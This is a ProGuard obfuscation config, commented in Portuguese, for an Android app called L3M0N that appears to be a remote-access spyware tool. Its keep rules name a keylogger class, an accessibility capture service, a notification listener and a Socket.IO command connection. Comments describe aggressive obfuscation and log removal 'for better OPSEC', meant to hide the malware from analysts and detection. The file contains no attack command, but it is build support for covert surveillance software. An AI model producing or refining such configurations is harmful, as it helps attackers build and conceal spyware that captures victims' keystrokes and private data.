# ============================================
# L3M0N - Ofuscação Agressiva (Nível Elite)
# ============================================

-optimizationpasses 7
-allowaccessmodification
-repackageclasses ''
-flattenpackagehierarchy ''
-dontusemixedcaseclassnames
-dontskipnonpubliclibraryclasses
-dontpreverify
-verbose
-ignorewarnings

# Dicionário de nomes curtos
-obfuscationdictionary dictionary.txt
-classobfuscationdictionary dictionary.txt
-packageobfuscationdictionary dictionary.txt

# ============================================
# KEEP - Somente o que é obrigatório
# ============================================

# Componentes do AndroidManifest (NÃO podem ser renomeados)
-keep class com.etechd.l3mon.MainActivity { *; }
-keep class com.etechd.l3mon.MainService { *; }
-keep class com.etechd.l3mon.L3M0NKeyLogger { *; }
-keep class com.etechd.l3mon.AccessibilityCaptureService { *; }
-keep class com.etechd.l3mon.NotificationListener { *; }
-keep class com.etechd.l3mon.MyReceiver { *; }
-keep class com.etechd.l3mon.ServiceReciever { *; }

# Classes críticas usadas por reflexão / Socket
-keep class com.etechd.l3mon.IOSocket { *; }
-keep class com.etechd.l3mon.ConnectionManager { *; }

# Construtores de Services e Receivers
-keepclassmembers class * extends android.app.Service {
    public <init>(...);
}
-keepclassmembers class * extends android.content.BroadcastReceiver {
    public <init>(...);
}
-keepclassmembers class * extends android.accessibilityservice.AccessibilityService {
    public <init>(...);
}

# Nativos
-keepclasseswithmembernames class * {
    native <methods>;
}

# Enums
-keepclassmembers enum * {
    public static **[] values();
    public static ** valueOf(java.lang.String);
}

# Socket.IO e dependências
-keep class io.socket.** { *; }
-dontwarn io.socket.**
-dontwarn org.json.**
-dontwarn okhttp3.**
-dontwarn okio.**

# Support Library
-dontwarn android.support.**
-keep class android.support.** { *; }

# Remover logs em release (melhor OPSEC)
-assumenosideeffects class android.util.Log {
    public static *** d(...);
    public static *** v(...);
    public static *** i(...);
    public static *** w(...);
    public static *** e(...);
}

# Manter anotações
-keepattributes *Annotation*
-keepattributes Signature
-keepattributes InnerClasses
-keepattributes EnclosingMethod